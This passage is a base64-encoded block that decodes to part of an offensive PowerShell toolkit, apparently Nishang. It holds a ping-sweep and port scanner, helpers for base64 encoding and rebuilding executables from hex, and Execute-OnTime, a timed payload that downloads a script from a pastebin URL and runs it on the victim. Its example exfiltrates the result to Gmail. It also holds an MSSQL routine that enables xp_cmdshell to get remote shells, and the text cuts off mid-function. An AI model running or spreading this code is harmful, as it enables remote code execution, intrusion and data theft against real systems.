LVJlc29sdmVIb3N0CgouRVhBTVBMRQpQb3J0LVNjYW4gLVN0YXJ0QWRkcmVzcyAxOTIuMTY4LjAuMSAtRW5kQWRkcmVzcyAxOTIuMTY4LjAuMjU0IC1SZXNvbHZlSG9zdCAtU2NhblBvcnQKCi5FWEFNUExFClBvcnQtU2NhbiAtU3RhcnRBZGRyZXNzIDE5Mi4xNjguMC4xIC1FbmRBZGRyZXNzIDE5Mi4xNjguMC4yNTQgLVJlc29sdmVIb3N0IC1TY2FuUG9ydCAtVGltZU91dCA1MDAKCi5FWEFNUExFClBvcnQtU2NhbiAtU3RhcnRBZGRyZXNzIDE5Mi4xNjguMC4xIC1FbmRBZGRyZXNzIDE5Mi4xNjguMTAuMjU0IC1SZXNvbHZlSG9zdCAtU2NhblBvcnQgLVBvcnQgODAKCi5MSU5LCmh0dHA6Ly93d3cudHJ1ZXNlYy5jb20KaHR0cDovL2Jsb2dzLnRlY2huZXQuY29tL2IvaGV5c2NyaXB0aW5nZ3V5L2FyY2hpdmUvMjAxMi8wNy8wMi91c2UtcG93ZXJzaGVsbC1mb3ItbmV0d29yay1ob3N0LWFuZC1wb3J0LWRpc2NvdmVyeS1zd2VlcHMuYXNweApodHRwczovL2dpdGh1Yi5jb20vc2FtcmF0YXNob2svbmlzaGFuZwogICAgCi5OT1RFUwpHb3VkZSAyMDEyLCBUcnVlU2VjCiM+CgoKW0NtZGxldEJpbmRpbmcoKV0gUGFyYW0oCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlLAogICAgICBQb3NpdGlvbiA9IDApXQogICAgW1ZhbGlkYXRlUGF0dGVybigiXGJcZHsxLDN9XC5cZHsxLDN9XC5cZHsxLDN9XC5cZHsxLDN9XGIiKV0KICAgIFtzdHJpbmddJFN0YXJ0QWRkcmVzcywKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUsCiAgICAgIFBvc2l0aW9uID0gMSldCiAgICBbVmFsaWRhdGVQYXR0ZXJuKCJcYlxkezEsM31cLlxkezEsM31cLlxkezEsM31cLlxkezEsM31cYiIpXQogICAgW3N0cmluZ10kRW5kQWRkcmVzcywKICAgIFtzd2l0Y2hdJFJlc29sdmVIb3N0LAogICAgW3N3aXRjaF0kU2NhblBvcnQsCiAgICBbaW50W11dJFBvcnRzID0gQCgyMSwyMiwyMyw1Myw2OSw3MSw4MCw5OCwxMTAsMTM5LDExMSwzODksNDQzLDQ0NSwxMDgwLDE0MzMsMjAwMSwyMDQ5LDMwMDEsMzEyOCw1MjIyLDY2NjcsNjg2OCw3Nzc3LDc4NzgsODA4MCwxNTIxLDMzMDYsMzM4OSw1ODAxLDU5MDAsNTU1NSw1OTAxKSwKICAgIFtpbnRdJFRpbWVPdXQgPSAxMDAKICApCiAgCiAgQmVnaW4gewogICAgJHBpbmcgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuTmV0d29ya2luZm9ybWF0aW9uLlBpbmcKICB9CiAgUHJvY2VzcyB7CiAgICBmb3JlYWNoKCRhIGluICgkU3RhcnRBZGRyZXNzLlNwbGl0KCIuIilbMF0uLiRFbmRBZGRyZXNzLlNwbGl0KCIuIilbMF0pKSB7CiAgICAgIGZvcmVhY2goJGIgaW4gKCRTdGFydEFkZHJlc3MuU3BsaXQoIi4iKVsxXS4uJEVuZEFkZHJlc3MuU3BsaXQoIi4iKVsxXSkpIHsKICAgICAgICBmb3JlYWNoKCRjIGluICgkU3RhcnRBZGRyZXNzLlNwbGl0KCIuIilbMl0uLiRFbmRBZGRyZXNzLlNwbGl0KCIuIilbMl0pKSB7CiAgICAgICAgICBmb3JlYWNoKCRkIGluICgkU3RhcnRBZGRyZXNzLlNwbGl0KCIuIilbM10uLiRFbmRBZGRyZXNzLlNwbGl0KCIuIilbM10pKSB7CiAgICAgICAgICAgIHdyaXRlLXByb2dyZXNzIC1hY3Rpdml0eSBQaW5nU3dlZXAgLXN0YXR1cyAiJGEuJGIuJGMuJGQiIC1wZXJjZW50Y29tcGxldGUgKCgkZC8oJEVuZEFkZHJlc3MuU3BsaXQoIi4iKVszXSkpICogMTAwKQogICAgICAgICAgICAkcGluZ1N0YXR1cyA9ICRwaW5nLlNlbmQoIiRhLiRiLiRjLiRkIiwkVGltZU91dCkKICAgICAgICAgICAgaWYoJHBpbmdTdGF0dXMuU3RhdHVzIC1lcSAiU3VjY2VzcyIpIHsKICAgICAgICAgICAgICBpZigkUmVzb2x2ZUhvc3QpIHsKICAgICAgICAgICAgICAgIHdyaXRlLXByb2dyZXNzIC1hY3Rpdml0eSBSZXNvbHZlSG9zdCAtc3RhdHVzICIkYS4kYi4kYy4kZCIgLXBlcmNlbnRjb21wbGV0ZSAoKCRkLygkRW5kQWRkcmVzcy5TcGxpdCgiLiIpWzNdKSkgKiAxMDApIC1JZCAxCiAgICAgICAgICAgICAgICAkZ2V0SG9zdEVudHJ5ID0gW05ldC5ETlNdOjpCZWdpbkdldEhvc3RFbnRyeSgkcGluZ1N0YXR1cy5BZGRyZXNzLCAkbnVsbCwgJG51bGwpCiAgICAgICAgICAgICAgfQogICAgICAgICAgICAgIGlmKCRTY2FuUG9ydCkgewogICAgICAgICAgICAgICAgJG9wZW5Qb3J0cyA9IEAoKQogICAgICAgICAgICAgICAgZm9yKCRpID0gMTsgJGkgLWxlICRwb3J0cy5Db3VudDskaSsrKSB7CiAgICAgICAgICAgICAgICAgICRwb3J0ID0gJFBvcnRzWygkaS0xKV0KICAgICAgICAgICAgICAgICAgd3JpdGUtcHJvZ3Jlc3MgLWFjdGl2aXR5IFBvcnRTY2FuIC1zdGF0dXMgIiRhLiRiLiRjLiRkIiAtcGVyY2VudGNvbXBsZXRlICgoJGkvKCRQb3J0cy5Db3VudCkpICogMTAwKSAtSWQgMgogICAgICAgICAgICAgICAgICAkY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVGNwQ2xpZW50CiAgICAgICAgICAgICAgICAgICRiZWdpbkNvbm5lY3QgPSAkY2xpZW50LkJlZ2luQ29ubmVjdCgkcGluZ1N0YXR1cy5BZGRyZXNzLCRwb3J0LCRudWxsLCRudWxsKQogICAgICAgICAgICAgICAgICBpZigkY2xpZW50LkNvbm5lY3RlZCkgewogICAgICAgICAgICAgICAgICAgICRvcGVuUG9ydHMgKz0gJHBvcnQKICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAjIFdhaXQKICAgICAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtTWlsbGkgJFRpbWVPdXQKICAgICAgICAgICAgICAgICAgICBpZigkY2xpZW50LkNvbm5lY3RlZCkgewogICAgICAgICAgICAgICAgICAgICAgJG9wZW5Qb3J0cyArPSAkcG9ydAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAkY2xpZW50LkNsb3NlKCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgaWYoJFJlc29sdmVIb3N0KSB7CiAgICAgICAgICAgICAgICAkaG9zdE5hbWUgPSAoW05ldC5ETlNdOjpFbmRHZXRIb3N0RW50cnkoW0lBc3luY1Jlc3VsdF0kZ2V0SG9zdEVudHJ5KSkuSG9zdE5hbWUKICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgIyBSZXR1cm4gT2JqZWN0CiAgICAgICAgICAgICAgTmV3LU9iamVjdCBQU09iamVjdCAtUHJvcGVydHkgQHsKICAgICAgICAgICAgICAgIElQQWRkcmVzcyA9ICIkYS4kYi4kYy4kZCI7CiAgICAgICAgICAgICAgICBIb3N0TmFtZSA9ICRob3N0TmFtZTsKICAgICAgICAgICAgICAgIFBvcnRzID0gJG9wZW5Qb3J0cwogICAgICAgICAgICAgIH0gfCBTZWxlY3QtT2JqZWN0IElQQWRkcmVzcywgSG9zdE5hbWUsIFBvcnRzCiAgICAgICAgICAgIH0KICAgICAgICAgIH0KICAgICAgICB9CiAgICAgIH0KICAgIH0KICB9CiAgRW5kIHsKICB9Cn0KCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI0NvbnZlcnQgYSBwbGFpbiBzdHJpbmcgdG8gQmFzZTY0IGVuY29kaW5nLiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwpmdW5jdGlvbiBTdHJpbmd0b0Jhc2U2NAp7CgoKPCMKLlNZTk9QU0lTCkhlbHBlciBmdW5jdGlvbiB3aGljaCBlbmNvZGVzIGEgc3RyaW5nIHRvIGJhc2U2NCBzdHJpbmcuCgouREVTQ1JJUFRJT04KVGhpcyBwYXlsb2FkIGVuY29kZXMgdGhlIGdpdmVuIHN0cmluZyB0byBiYXNlNjQgc3RyaW5nIGFuZCB3cml0ZXMgaXQgdG8gYmFzZTY0ZW5jb2RlZC50eHQgaW4gY3VycmVudCBkaXJlY3RvcnkuCi5QQVJBTUVURVIgU3RyClRoZSBzdHJpbmcgdG8gYmUgZW5jb2RlZAoKLlBBUkFNRVRFUiBPdXRwdXRGaWxlClRoZSBwYXRoIG9mIHRoZSBvdXRwdXQgZmlsZS4gRGVmYXVsdCBpcyAiZW5jb2RlZC50eHQiIGluIHRoZSBjdXJyZW50IHdvcmtpbmcgZGlyZWN0b3J5LgoKLlBBUkFNRVRFUiBJc1N0cmluZwpVc2UgdGhpcyB0byBzcGVjaWZ5IGlmIHlvdSBhcmUgcGFzc2luZyBhIHN0cmluZyBpbnMgcGxhY2Ugb2YgYSBmaWxlcGF0aC4KCi5FWEFNUExFClBTID4gU3RyaW5nVG9CYXNlNjQgInN0YXJ0LXByb2Nlc3MgY2FsYy5leGUiIC1Jc1N0cmluZwoKLkxJTksKaHR0cDovL2xhYm9mYXBlbmV0cmF0aW9udGVzdGVyLmJsb2dzcG90LmNvbS8KaHR0cHM6Ly9naXRodWIuY29tL3NhbXJhdGFzaG9rL25pc2hhbmcKIz4KCgogICAgW0NtZGxldEJpbmRpbmcoKV0gCiAgICAgICAgUGFyYW0oIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkRmFsc2UpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFN0ciwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICRGYWxzZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkb3V0cHV0ZmlsZT0iLlxiYXNlNjRlbmNvZGVkLnR4dCIsIAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRJc1N0cmluZwogICAgKQoKICAgaWYoJElzU3RyaW5nIC1lcSAkdHJ1ZSkKICAgIHsKICAgIAogICAgICAgICR1dGZieXRlcyAgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldEJ5dGVzKCRTdHIpCiAgICAgICAKICAgIH0KICBlbHNlCiAgICB7CiAgICAgICAgJHV0ZmJ5dGVzICA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0Qnl0ZXMoKEdldC1Db250ZW50ICRTdHIpKQogICAgfQoKICAkYmFzZTY0c3RyaW5nID0gW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJHV0ZmJ5dGVzKQogIE91dC1GaWxlIC1JbnB1dE9iamVjdCAkYmFzZTY0c3RyaW5nIC1FbmNvZGluZyBhc2NpaSAtRmlsZVBhdGggIiRvdXRwdXRmaWxlIgogIFdyaXRlLU91dHB1dCAiRW5jb2RlZCBkYXRhIHdyaXR0ZW4gdG8gZmlsZSAkb3V0cHV0ZmlsZSIKfQoKCgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjQ29udmVydCBhbiBleGVjdXRhYmxlIGZpbGUgaW4gaGV4IGZvcm1hdCB0byBleGVjdXRhYmxlICguZXhlKSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCmZ1bmN0aW9uIFRleHR0b0VYRQp7Cgo8IwouU1lOT1BTSVMKRnVuY3Rpb24gdG8gY29udmVydCBhIFBFIGZpbGUgaW4gaGV4IGZvcm1hdCB0byBleGVjdXRhYmxlCgouREVTQ1JJUFRJT04KVGhpcyBmdW5jdGlvbiBjb252ZXJ0cyBhIFBFIGZpbGUgaW4gaGV4IHRvIGV4ZWN1dGFibGUgYW5kIHdyaXRlcyBpdCB0byB1c2VyIHRlbXAuCgouUEFSQU1FVEVSIEZpbGVuYW1lClBhdGggb2YgdGhlIGhleCB0ZXh0IGZpbGUgZnJvbSB3aGljaCAgZXhlY3V0YWJsZSB3aWxsIGJlIGNyZWF0ZWQuCgouUEFSQU1FVEVSIEVYRQpQYXRoIHdoZXJlIHRoZSBleGVjdXRhYmxlIHNob3VsZCBiZSBjcmVhdGVkLgoKLkVYQU1QTEUKUFMgPiBUZXh0dG9FeGUgQzpcZXZpbC50ZXh0IEM6XGV4ZVxldmlsLmV4ZQoKLkxJTksKaHR0cDovL3d3dy5leHBsb2l0LW1vbmRheS5jb20vMjAxMS8wOS9kcm9wcGluZy1leGVjdXRhYmxlcy13aXRoLXBvd2Vyc2hlbGwuaHRtbApodHRwczovL2dpdGh1Yi5jb20vc2FtcmF0YXNob2svbmlzaGFuZwojPgoKCiAgICBbQ21kbGV0QmluZGluZygpXSBQYXJhbSAoIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRmlsZU5hbWUsCiAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtTdHJpbmddJEVYRQogICAgKQogICAgCiAgICBbU3RyaW5nXSRoZXhkdW1wID0gZ2V0LWNvbnRlbnQgLXBhdGggIiRGaWxlbmFtZSIKICAgIFtCeXRlW11dICR0ZW1wID0gJGhleGR1bXAgLXNwbGl0ICcgJwogICAgW1N5c3RlbS5JTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygkRVhFLCAkdGVtcCkKICAgIFdyaXRlLU91dHB1dCAiRXhlY3V0YWJsZSB3cml0dGVuIHRvIGZpbGUgJEVYRSIKfQoKCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNXYWl0cyB0aWxsIGdpdmVuIHRpbWUgdG8gZXhlY3V0ZSBhIHNjcmlwdC4jIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCmZ1bmN0aW9uIEV4ZWN1dGUtT25UaW1lCnsKCjwjCi5TWU5PUFNJUwpQYXlsb2FkIHdoaWNoIHdhaXRzIHRpbGwgZ2l2ZW4gdGltZSB0byBleGVjdXRlIGEgc2NyaXB0LgoKLkRFU0NSSVBUSU9OClRoaXMgcGF5bG9hZCB3YWl0cyB0aWxsIHRoZSBnaXZlbiB0aW1lIChvbiB0aGUgdmljdGltKSBhbmQgdGhlbiBkb3dubG9hZHMgYSBQb3dlclNoZWxsIHNjcmlwdCBhbmQgZXhlY3V0ZXMgaXQuCgouUEFSQU1FVEVSIFBBWUxPQURVUkwKVGhlIFVSTCBmcm9tIHdoZXJlIHRoZSBmaWxlIHdvdWxkIGJlIGRvd25sb2FkZWQuCgouUEFSQU1FVEVSIEFyZ3VtZW50cwpBcmd1bWVudHMgdG8gYmUgcGFzc2VkIHRvIGEgc2NyaXB0LiBQb3dlcnByZXRlciBhbmQgb3RoZXIgc2NyaXB0cyBpbiBOaXNoYW5nIG5lZWQgdGhlIGZ1bmN0aW9uIG5hbWUgYW5kIGFyZ3VtZW50cyBoZXJlLgoKLlBBUkFNRVRFUiB0aW1lClRoZSBUaW1lIHdoZW4gdGhlIHBheWxvYWQgd2lsbCBiZSBleGVjdXRlZCAoaW4gMjQgaG91ciBmb3JtYXQgZS5nLiAyMzoyMSkuCgouUEFSQU1FVEVSIENoZWNrVVJMClRoZSBVUkwgd2hpY2ggdGhlIHBheWxvYWQgd291bGQgY2hlY2sgZm9yIGluc3RydWN0aW9ucyB0byBzdG9wLgoKLlBBUkFNRVRFUiBTdG9wU3RyaW5nClRoZSBzdHJpbmcgd2hpY2ggaWYgZm91bmQgYXQgQ2hlY2tVUkwgd2lsbCBzdG9wIHRoZSBwYXlsb2FkLgoKLkVYQU1QTEUKUFMgPiBFeGVjdXRlLU9uVGltZSAtUGF5bG9hZFVSTCBodHRwOi8vcGFzdGViaW4uY29tL3Jhdy5waHA/aT1aaHlmOHJ3aCAtQXJndW1lbnRzIEdldC1JbmZvcm1hdGlvbiAtVGltZSBoaDptbSAtQ2hlY2tVUkwgaHR0cDovL3Bhc3RlYmluLmNvbS9yYXcucGhwP2k9Wmh5Zjhyd2ggLVN0b3BTdHJpbmcgc3RvcHBheWxvYWQKCkVYQU1QTEUKUFMgPiBFeGVjdXRlLU9uVGltZSAtUGF5bG9hZFVSTCBodHRwOi8vcGFzdGViaW4uY29tL3Jhdy5waHA/aT1aaHlmOHJ3aCAtQXJndW1lbnRzIEdldC1JbmZvcm1hdGlvbiAtVGltZSBoaDptbSAtQ2hlY2tVUkwgaHR0cDovL3Bhc3RlYmluLmNvbS9yYXcucGhwP2k9Wmh5Zjhyd2ggLVN0b3BTdHJpbmcgc3RvcHBheWxvYWQgfCBEby1FeGZpbHRyYXRpb24gLUV4ZmlsT3B0aW9uIGdtYWlsIC11c2VybmFtZSA8PiAtUGFzc3dvcmQgPD4KClVzZSBhYm92ZSBjb21tYW5kIGZvciBkYXRhIGV4ZmlsdHJhdGlvbiB0byBnbWFpbAoKCi5MSU5LCmh0dHA6Ly9sYWJvZmFwZW5ldHJhdGlvbnRlc3Rlci5jb20vCmh0dHBzOi8vZ2l0aHViLmNvbS9zYW1yYXRhc2hvay9uaXNoYW5nCiM+CgoKCiAgICBbQ21kbGV0QmluZGluZygpXSBQYXJhbSgKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRQYXlsb2FkVVJMLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEFyZ3VtZW50cyA9ICJPdXQtTnVsbCIsCgoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJHRpbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ2hlY2tVUkwsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA0LCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU3RvcFN0cmluZwoKICAgICkKCiAgICAKCiAgICB3aGlsZSgkdHJ1ZSkKICAgIHsKICAgICAgICAkZXhlYyA9IDAKICAgICAgICBzdGFydC1zbGVlcCAtc2Vjb25kcyA1IAogICAgICAgICR3ZWJjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50CiAgICAgICAgJGZpbGVjb250ZW50ID0gJHdlYmNsaWVudC5Eb3dubG9hZFN0cmluZygiJENoZWNrVVJMIikKICAgICAgICAkc3lzdGltZSA9IEdldC1EYXRlIC1VRm9ybWF0ICVSCiAgICAgICAgaWYgKCRzeXN0aW1lIC1tYXRjaCAkdGltZSkKICAgICAgICB7CiAgICAgICAgICAgICRwYXN0ZXZhbHVlID0gSW52b2tlLUV4cHJlc3Npb24gJHdlYmNsaWVudC5Eb3dubG9hZFN0cmluZygkUGF5bG9hZFVSTCkKICAgICAgICAgICAgIyBDaGVjayBmb3IgYXJndW1lbnRzIHRvIHRoZSBkb3dubG9hZGVkIHNjcmlwdC4KICAgICAgICAgICAgaWYgKCRBcmd1bWVudHMgLW5lICJPdXQtTnVsbCIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRwYXN0ZXZhbHVlID0gSW52b2tlLUV4cHJlc3Npb24gJEFyZ3VtZW50cyAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgfQogICAgICAgICAgICAkcGFzdGV2YWx1ZQogICAgICAgICAgICAkZXhlYysrCiAgICAgICAgICAgIGlmICgkZXhlYyAtZXEgMSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgNjAKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCRmaWxlY29udGVudCAtZXEgJFN0b3BTdHJpbmcpCiAgICAgICAgewogICAgICAgICAgICBicmVhawogICAgICAgIH0KICAgIH0KfQoKCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjRXhlY3V0ZSBjb21tYW5kcyByZW1vdGVseSBvbiBhIE1TIFNRTCBzZXJ2ZXIuIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwpmdW5jdGlvbiBFeGVjdXRlLUNvbW1hbmQtTVNTUUwKewoKPCMKLlNZTk9QU0lTClBheWxvYWQgd2hpY2ggY291bGQgYmUgdXNlZCB0byBleGVjdXRlIGNvbW1hbmRzIHJlbW90ZWx5IG9uIGEgTVMgU1FMIHNlcnZlci4KCi5ERVNDUklQVElPTgpUaGlzIHBheWxvYWQgbmVlZHMgYSB2YWxpZCBhZG1pbmlzdHJhdG9yIHVzZXJuYW1lIGFuZCBwYXNzd29yZCBvbiByZW1vdGUgU1FMIHNlcnZlci4KSXQgdXNlcyB0aGUgY3JlZGVudGlhbHMgdG8gZW5hYmxlIHhwX2NtZHNoZWxsIGFuZCBwcm92aWRlcyBhIHBvd2Vyc2hlbGwgc2hlbGwsIGEgc3FsIHNoZWxsCm9yIGEgY21kIHNoZWxsIG9uIHRoZSB0YXJnZXQuCgouUEFSQU1FVEVSIENvbXB1dGVyTmFtZQpFbnRlciBDb3BtdXRlck5hbWUgb3IgSVAgQWRkcmVzcyBvZiB0aGUgdGFyZ2V0IFNRTCBzZXJ2ZXIuCgouUEFSQU1FVEVSIFVzZXJOYW1lCkVudGVyIGEgVXNlck5hbWUgZm9yIGEgU1FMIHNlcnZlciBhZG1pbmlzdHJhdG9yIGFjY291bnQuCgouUEFSQU1FVEVSIFBhc3N3b3JkCkVudGVyIHRoZSBQYXNzd29yZCBmb3IgdGhlIGFjY291bnQuCgouRVhBTVBMRQpFeGVjdXRlLUNvbW1hbmQtTVNTUUwgLUNvbXB1dGVyTmFtZSBzcWxzZXJ2MDEgLVVzZXJOYW1lIHNhIC1QYXNzd29yZCBzYTEyMzQKCi5FWEFNUExFCkV4ZWN1dGUtQ29tbWFuZC1NU1NRTCAtQ29tcHV0ZXJOYW1lIDE5Mi4xNjguMS4xMCAtVXNlck5hbWUgc2EgLVBhc3N3b3JkIHNhMTIzNAoKLkxJTksKaHR0cDovL2xhYm9mYXBlbmV0cmF0aW9udGVzdGVyLmNvbS8KaHR0cHM6Ly9naXRodWIuY29tL3NhbXJhdGFzaG9rL25pc2hhbmcKCi5OT1RFUwpCYXNlZCBtb3N0bHkgb24gdGhlIEdldC1UU1NxbFN5c0xvZ2luIGJ5IE5pa2xhcyBHb3VkZSBhbmQgYWNjb21wYW55aW5nIGJsb2cgcG9zdCBhdCAKaHR0cDovL2Jsb2dzLnRlY2huZXQuY29tL2IvaGV5c2NyaXB0aW5nZ3V5L2FyY2hpdmUvMjAxMi8wNy8wMy91c2UtcG93ZXJzaGVsbC10by1zZWN1cml0eS10ZXN0LXNxbC1zZXJ2ZXItYW5kLXNoYXJlcG9pbnQuYXNweApodHRwOi8vd3d3LnRydWVzZWMuY29tCgojPgoKICAgIFtDbWRsZXRCaW5kaW5nKCldIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUsIFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZUxpbmU9ICR0cnVlKV0KICAgICAgICBbQWxpYXMoIlBTQ29tcHV0ZXJOYW1lIiwiQ04iLCJNYWNoaW5lTmFtZSIsIklQIiwiSVBBZGRyZXNzIildCiAgICAgICAgW3N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJOYW1lLAoKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlLCBQb3NpdGlvbiA9IDEpXQogICAgICAgIFtzdHJpbmddCiAgICAgICAgJFVzZXJOYW1lLAogICAgCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSwgUG9zaXRpb24gPSAyKV0KICAgICAgICBbc3RyaW5nXQogICAgICAgICRQYXNzd29yZAogICAgKQpUcnl7CiAgICBmdW5jdGlvbiBNYWtlLUNvbm5lY3Rpb24gKCRxdWVyeSl7CiAKICAgICRDb25uZWN0aW9uID0gTmV3LU9iamVjdCBTeXN0ZW0uRGF0YS5TUUxDbGllbnQuU1FMQ29ubmVjdGlvbgogICAgJENvbm5lY3Rpb24uQ29ubmVjdGlvblN0cmluZyA9ICJEYXRhIFNvdXJjZT0kQ29tcHV0ZXJOYW1lO0luaXRpYWwgQ2F0YWxvZz1NYXN0ZXI7VXNlciBJZD0kdXNlck5hbWU7UGFzc3dvcmQ9JHBhc3N3b3JkOyIKICAgICRDb25uZWN0aW9uLk9wZW4oKQogICAgJENvbW1hbmQgPSBOZXctT2JqZWN0IFN5c3RlbS5EYXRhLlNRTENsaWVudC5TUUxDb21tYW5kCiAgICAkQ29tbWFuZC5Db25uZWN0aW9uID0gJENvbm5lY3Rpb24KICAgICRDb21tYW5kLkNvbW1hbmRUZXh0ID0gJHF1ZXJ5CiAgICAkUmVhZGVyID0gJENvbW1hbmQuRXhlY3V0ZVJlYWRlcigpCiAgICAkQ29ubmVjdGlvbi5DbG9zZSgpCgogICAgfQogIAogICAgIkNvbm5lY3RpbmcgdG8gJENvbXB1dGVyTmFtZS4uLiIgCglzdGFydC1zbGVlcCAzIAogICAgTWFrZS1Db25uZWN0aW9uICJFWEVDIHNwX2NvbmZpZ3VyZSAnc2hvdyBhZHZhbmNlZCBvcHRpb25zJywxOyBSRUNPTkZJR1VSRTsiCiAgICAiYG5FbmFibGluZyBYUF9DTURTSEVMTC4uLmBuIgogICAgc3RhcnQtc2xlZXAgMwogICAgTWFrZS1Db25uZWN0aW9uICJFWEVDIHNwX2NvbmZpZ3VyZSAneHBfY21kc2hlbGwnLDE7IFJFQ09ORklHVVJFIgogICAgd3JpdGUtaG9zdCAtTm9OZXdsaW5lICJEbyB5b3Ugd2FudCBhIFBvd2VyU2hlbGwgc2hlbGwgKFApIG9yIGEgU1FMIFNoZWxsIChTKSBvciBhIGNtZCBzaGVsbCAoQyk6ICIKICAgICRzaGVsbCA9IHJlYWQtaG9zdAogICAgd2hpbGUoJHBheWxvYWQgLW5lICJleGl0IikKICAgIHsKICAgICAgICAkQ29ubmVjdGlvbiA9IE5ldy1PYmplY3QgU3lzdGVtLkRhdGEuU1FMQ2xpZW50LlNRTENvbm5lY3Rpb24KICAgICAgICAkQ29ubmVjdGlvbi5Db25uZWN0aW9uU3RyaW5nID0gIkRhdGEgU291cmNlPSRDb21wdXRlck5hbWU7SW5pdGlhbCBDYXRhbG9nPU1hc3RlcjtVc2VyIElkPSR1c2VyTmFtZTtQYXNzd29yZD0kcGFzc3dvcmQ7IgogICAgICAgICRDb25uZWN0aW9uLk9wZW4oKQogICAgICAgICRDb21tYW5kID0gTmV3LU9iamVjdCBTeXN0ZW0uRGF0YS5TUUxDbGllbnQuU1FMQ29tbWFuZAogICAgICAgICRDb21tYW5kLkNvbm5lY3Rpb24gPSAkQ29ubmVjdGlvbgogICAgICAgIGlmICgkc2hlbGwgLWVxICJQIikKICAgICAgICB7CiAgICAgICAgICAgIHdyaXRlLWhvc3QgImBuYG5TdGFydGluZyBQb3dlclNoZWxsIG9uIHRoZSB0YXJnZXQuLmBuIgogICAgICAgICAgICB3cml0ZS1ob3N0IC1Ob05ld2xpbmUgIlBTICRDb21wdXRlck5hbWU+ICIKICAgICAgICAgICAgJHBheWxvYWQgPSByZWFkLWhvc3QKICAgICAgICAgICAgJGNtZCA9ICJFWEVDIHhwX2NtZHNoZWxsICdwb3dlcnNoZWxsLmV4ZSAtQ29tbWFuZCBgIiYgeyRwYXlsb2FkfWAiJyIKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkc2hlbGwgLWVxICJTIikKICAgICAgICB7CiAgICAgICAgICAgIHdyaXRlLWhvc3QgImBuYG5TdGFydGluZyBTUUwgc2hlbGwgb24gdGhlIHRhcmdldC4uYG4iCiAgICAgICAgICAgIHdyaXRlLWhvc3QgLU5vTmV3bGluZSAiTVNTUUwgJENvbXB1dGVyTmFtZT4gIgogICAgICAgICAgICAkcGF5bG9hZCA9IHJlYWQtaG9zdAogICAgICAgICAgICAkY21kID0gJHBheWxvYWQKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkc2hlbGwgLWVxICJDIikKIC